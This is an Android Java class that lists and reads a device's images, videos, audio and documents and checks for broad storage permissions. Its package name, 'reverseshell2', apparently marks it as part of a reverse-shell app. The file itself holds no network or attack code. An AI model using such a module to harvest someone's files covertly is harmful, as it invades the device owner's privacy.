package com.example.reverseshell2;

import android.content.Context;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.DocumentsContract;
import android.provider.MediaStore;
import android.util.Log;
import androidx.annotation.RequiresApi;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Modern storage access implementation using MediaStore API and SAF
 * Complies with Android 10+ scoped storage requirements
 */
public class ModernStorageManager {
    
    private static final String TAG = "ModernStorageManager";
    private Context context;
    
    public ModernStorageManager(Context context) {
        this.context = context;
    }
    
    /**
     * Get media files using MediaStore API (Android 10+ compatible)
     */
    public List<MediaFile> getMediaFiles(String mediaType) {
        List<MediaFile> mediaFiles = new ArrayList<>();
        
        try {
            Uri collection;
            String[] projection;
            
            switch (mediaType.toLowerCase()) {
                case "images":
                    collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    projection = new String[]{
                        MediaStore.Images.Media._ID,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DATE_ADDED
                    };
                    break;
                case "videos":
                    collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                    projection = new String[]{
                        MediaStore.Video.Media._ID,
                        MediaStore.Video.Media.DISPLAY_NAME,
                        MediaStore.Video.Media.SIZE,
                        MediaStore.Video.Media.DATE_ADDED
                    };
                    break;
                case "audio":
                    collection = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                    projection = new String[]{
                        MediaStore.Audio.Media._ID,
                        MediaStore.Audio.Media.DISPLAY_NAME,
                        MediaStore.Audio.Media.SIZE,
                        MediaStore.Audio.Media.DATE_ADDED
                    };
                    break;
                default:
                    Log.w(TAG, "Unknown media type: " + mediaType);
                    return mediaFiles;
            }
            
            ContentResolver resolver = context.getContentResolver();
            
            try (Cursor cursor = resolver.query(collection, projection, null, null, null)) {
                if (cursor != null) {
                    int idColumn = cursor.getColumnIndexOrThrow(projection[0]);
                    int nameColumn = cursor.getColumnIndexOrThrow(projection[1]);
                    int sizeColumn = cursor.getColumnIndexOrThrow(projection[2]);
                    int dateColumn = cursor.getColumnIndexOrThrow(projection[3]);
                    
                    while (cursor.moveToNext()) {
                        long id = cursor.getLong(idColumn);
                        String name = cursor.getString(nameColumn);
                        long size = cursor.getLong(sizeColumn);
                        long dateAdded = cursor.getLong(dateColumn);
                        
                        Uri contentUri = Uri.withAppendedPath(collection, String.valueOf(id));
                        
                        MediaFile mediaFile = new MediaFile(id, name, contentUri, size, dateAdded, mediaType);
                        mediaFiles.add(mediaFile);
                    }
                }
            }
            
            Log.d(TAG, "Retrieved " + mediaFiles.size() + " " + mediaType + " files");
            
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving media files", e);
        }
        
        return mediaFiles;
    }
    
    /**
     * Read file content using modern content resolver
     */
    public byte[] readFileContent(Uri fileUri) {
        try {
            ContentResolver resolver = context.getContentResolver();
            InputStream inputStream = resolver.openInputStream(fileUri);
            
            if (inputStream != null) {
                byte[] buffer = new byte[inputStream.available()];
                inputStream.read(buffer);
                inputStream.close();
                return buffer;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading file content", e);
        }
        
        return new byte[0];
    }
    
    /**
     * Get document files from SAF (requires user permission)
     */
    @RequiresApi(api = Build.VERSION_CODES.Q)
    public List<DocumentFile> getDocumentFiles(Uri treeUri) {
        List<DocumentFile> documents = new ArrayList<>();
        
        try {
            ContentResolver resolver = context.getContentResolver();
            Uri childrenUri = DocumentsContract.buildChildDocumentsUriUsingTree(
                treeUri, DocumentsContract.getTreeDocumentId(treeUri));
            
            String[] projection = new String[]{
                DocumentsContract.Document.COLUMN_DOCUMENT_ID,
                DocumentsContract.Document.COLUMN_DISPLAY_NAME,
                DocumentsContract.Document.COLUMN_MIME_TYPE,
                DocumentsContract.Document.COLUMN_SIZE,
                DocumentsContract.Document.COLUMN_LAST_MODIFIED
            };
            
            try (Cursor cursor = resolver.query(childrenUri, projection, null, null, null)) {
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String documentId = cursor.getString(0);
                        String displayName = cursor.getString(1);
                        String mimeType = cursor.getString(2);
                        long size = cursor.getLong(3);
                        long lastModified = cursor.getLong(4);
                        
                        Uri documentUri = DocumentsContract.buildDocumentUriUsingTree(treeUri, documentId);
                        
                        DocumentFile docFile = new DocumentFile(documentId, displayName, 
                            documentUri, mimeType, size, lastModified);
                        documents.add(docFile);
                    }
                }
            }
            
            Log.d(TAG, "Retrieved " + documents.size() + " document files");
            
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving document files", e);
        }
        
        return documents;
    }
    
    /**
     * Check if app has storage permissions for Android version
     */
    public boolean hasStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ - check if we have MANAGE_EXTERNAL_STORAGE
            return Environment.isExternalStorageManager();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10 - scoped storage, check media permissions
            return context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) 
                == android.content.pm.PackageManager.PERMISSION_GRANTED;
        } else {
            // Android 9 and below
            return context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) 
                == android.content.pm.PackageManager.PERMISSION_GRANTED &&
                context.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) 
                == android.content.pm.PackageManager.PERMISSION_GRANTED;
        }
    }
    
    /**
     * Inner class for media file representation
     */
    public static class MediaFile {
        public long id;
        public String name;
        public Uri uri;
        public long size;
        public long dateAdded;
        public String type;
        
        public MediaFile(long id, String name, Uri uri, long size, long dateAdded, String type) {
            this.id = id;
            this.name = name;
            this.uri = uri;
            this.size = size;
            this.dateAdded = dateAdded;
            this.type = type;
        }
    }
    
    /**
     * Inner class for document file representation
     */
    public static class DocumentFile {
        public String id;
        public String name;
        public Uri uri;
        public String mimeType;
        public long size;
        public long lastModified;
        
        public DocumentFile(String id, String name, Uri uri, String mimeType, long size, long lastModified) {
            this.id = id;
            this.name = name;
            this.uri = uri;
            this.mimeType = mimeType;
            this.size = size;
            this.lastModified = lastModified;
        }
    }
}